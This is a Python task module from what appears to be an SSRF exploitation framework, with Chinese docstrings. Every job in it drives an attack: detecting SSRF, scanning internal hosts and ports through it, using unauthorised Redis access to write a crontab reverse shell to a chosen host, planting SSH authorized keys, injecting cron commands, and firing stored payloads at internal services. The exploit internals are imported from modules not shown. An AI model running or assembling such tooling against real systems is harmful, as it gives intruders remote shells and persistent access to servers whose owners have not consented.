# coding=utf-8
import logging
import mongoengine as doc

import settings
from ssrf import Job, connect, SsrfCheck, SsrfScan, redis_exploit, payload
from ssrf.payload import payload_list

_log = logging.getLogger(__name__)
connect(**settings.MONGODB)


def ssrf_check(job):
    """
    检测传入的url是否存在ssrf漏洞
    :param job:
    :return:
    """
    try:
        job.state = Job.RUNNING
        job.save()
        result = SsrfCheck(url=job.url, data=job.data).test()
        job.vulnerable = result['vul']
        job.param = result['param']
        job.state = Job.FINISHED
        job.save()
    except doc.NotUniqueError:
        job.state = Job.TERMINATED


def ssrf_scan(job):
    """
    利用ssrf进行内网存活ip和端口扫描
    :param job:
    :return:
    """
    try:
        job.state = Job.RUNNING
        job.save()
        result = SsrfScan(url=job.url, param=job.param, ip_pool=job.ip_pool).scan_init()
        job.ip_port = result
        job.state = Job.FINISHED
        job.save()
    except doc.NotUniqueError:
        job.state = Job.TERMINATED


def redis_shell_task(job):
    """
    利用redis未授权访问写crontab反弹shell
    :param job:
    :return:
    """
    try:
        job.state = Job.RUNNING
        job.save()
        redis_exploit(url=job.url, param=job.param, host=job.redis_host, port=job.redis_port, bhost= \
            job.shell_host, bport=job.shell_port).redis_shell()
        job.state = Job.FINISHED
        job.save()
    except doc.NotUniqueError:
        job.state = Job.TERMINATED


def redis_ssh_key(job):
    """
    利用redis未授权访问写ssh登录公钥
    :param job:
    :return:
    """
    try:
        job.state = Job.RUNNING
        job.save()
        redis_exploit(url=job.url, param=job.param, host=job.redis_host, port=job.redis_port, authorized_keys= \
            job.authorized_keys).redis_write_authorized_keys()
        job.state = Job.FINISHED
        job.save()
    except doc.NotUniqueError:
        job.state = Job.TERMINATED


def redis_cron_command_task(job):
    """
    利用redis未授权向crontab写入命令
    :param job:
    :return:
    """
    try:
        job.state = Job.RUNNING
        job.save()
        redis_exploit(url=job.url, param=job.param, host=job.redis_host, port=job.redis_port, command=job.cron_command)\
            .redis_cron_command()
        job.state = Job.FINISHED
        job.save()
    except doc.NotUniqueError:
        job.state = Job.TERMINATED


def payload_attack_task(job):
    """
    调用payload攻击内网服务
    :param job:
    :return:
    """
    try:
        job.state = Job.RUNNING
        job.payload_list = payload_list()
        job.save()
        payload.payload_exploit(url=job.url, param=job.param, host=job.payload_host, payload_name=job.payload_name).payload_attack()
        job.state = Job.FINISHED
        job.save()
    except doc.NotUniqueError:
        job.state = Job.TERMINATED
